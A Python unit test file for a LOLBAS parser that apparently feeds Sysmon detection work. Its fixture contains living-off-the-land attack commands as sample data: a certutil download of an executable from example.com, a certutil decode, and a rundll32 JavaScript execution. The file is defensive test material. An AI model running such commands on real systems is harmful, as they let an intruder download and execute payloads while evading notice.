"""Unit tests for LOLBAS parser."""

import pytest

from lolbas_sysmon.services import LOLBASParser


class TestLOLBASParser:
    """Tests for LOLBASParser class."""

    @pytest.fixture
    def parser(self):
        """Create parser instance."""
        return LOLBASParser()

    @pytest.fixture
    def sample_raw_data(self):
        """Sample raw LOLBAS JSON data."""
        return [
            {
                "Name": "Certutil.exe",
                "OriginalFileName": "CertUtil.exe",
                "Description": "Windows Certificate Utility",
                "Commands": [
                    {
                        "Command": "certutil.exe -urlcache -f http://example.com/file.exe",
                        "Description": "Download file",
                        "MitreID": "T1105",
                        "Category": "Download",
                    },
                    {"Command": "certutil.exe -decode input.txt output.exe", "Description": "Decode file", "MitreID": "T1140", "Category": "Decode"},
                ],
                "ATT&CK": [{"ID": "T1105"}, {"ID": "T1140"}],
            },
            {
                "Name": "Rundll32.exe",
                "OriginalFileName": "RUNDLL32.EXE",
                "Description": "Run DLL as application",
                "Commands": [{"Command": "rundll32.exe javascript:evil", "Description": "Execute JavaScript", "MitreID": "T1218.011", "Category": "Execute"}],
                "ATT&CK": [{"ID": "T1218.011"}],
            },
        ]

    def test_parse_returns_lolbins(self, parser, sample_raw_data):
        """Test parsing returns list of LOLBin objects."""
        lolbins = parser.parse(sample_raw_data)

        assert len(lolbins) == 2
        assert lolbins[0].name == "Certutil.exe"
        assert lolbins[1].name == "Rundll32.exe"

    def test_parse_extracts_original_filename(self, parser, sample_raw_data):
        """Test parsing extracts OriginalFileName."""
        lolbins = parser.parse(sample_raw_data)

        assert lolbins[0].original_filename == "CertUtil.exe"
        assert lolbins[1].original_filename == "RUNDLL32.EXE"

    def test_parse_extracts_commands(self, parser, sample_raw_data):
        """Test parsing extracts commands correctly."""
        lolbins = parser.parse(sample_raw_data)

        assert len(lolbins[0].commands) == 2
        assert lolbins[0].commands[0].category == "Download"
        assert lolbins[0].commands[1].category == "Decode"

    def test_parse_extracts_mitre_ids(self, parser, sample_raw_data):
        """Test parsing extracts MITRE ATT&CK IDs."""
        lolbins = parser.parse(sample_raw_data)

        assert "T1105" in lolbins[0].mitre_ids
        assert "T1140" in lolbins[0].mitre_ids

    def test_parse_skips_empty_names(self, parser):
        """Test parsing skips entries without names."""
        raw_data = [{"Name": "", "Description": "No name"}, {"Name": "Valid.exe", "Description": "Has name", "Commands": []}]
        lolbins = parser.parse(raw_data)

        assert len(lolbins) == 1
        assert lolbins[0].name == "Valid.exe"

    def test_filter_by_category(self, parser, sample_raw_data):
        """Test filtering LOLBins by category."""
        lolbins = parser.parse(sample_raw_data)

        download_lolbins = parser.filter_by_category(lolbins, "Download")
        assert len(download_lolbins) == 1
        assert download_lolbins[0].name == "Certutil.exe"

        execute_lolbins = parser.filter_by_category(lolbins, "Execute")
        assert len(execute_lolbins) == 1
        assert execute_lolbins[0].name == "Rundll32.exe"

    def test_filter_by_category_no_matches(self, parser, sample_raw_data):
        """Test filtering returns empty list when no matches."""
        lolbins = parser.parse(sample_raw_data)

        filtered = parser.filter_by_category(lolbins, "NonExistent")
        assert filtered == []

    def test_parse_handles_missing_attack_field(self, parser):
        """Test parsing handles missing ATT&CK field."""
        raw_data = [{"Name": "Test.exe", "Description": "Test", "Commands": []}]
        lolbins = parser.parse(raw_data)

        assert len(lolbins) == 1
        assert lolbins[0].mitre_ids == []

    def test_parse_handles_null_attack_field(self, parser):
        """Test parsing handles null ATT&CK field."""
        raw_data = [{"Name": "Test.exe", "Description": "Test", "Commands": [], "ATT&CK": None}]
        lolbins = parser.parse(raw_data)

        assert len(lolbins) == 1
        assert lolbins[0].mitre_ids == []
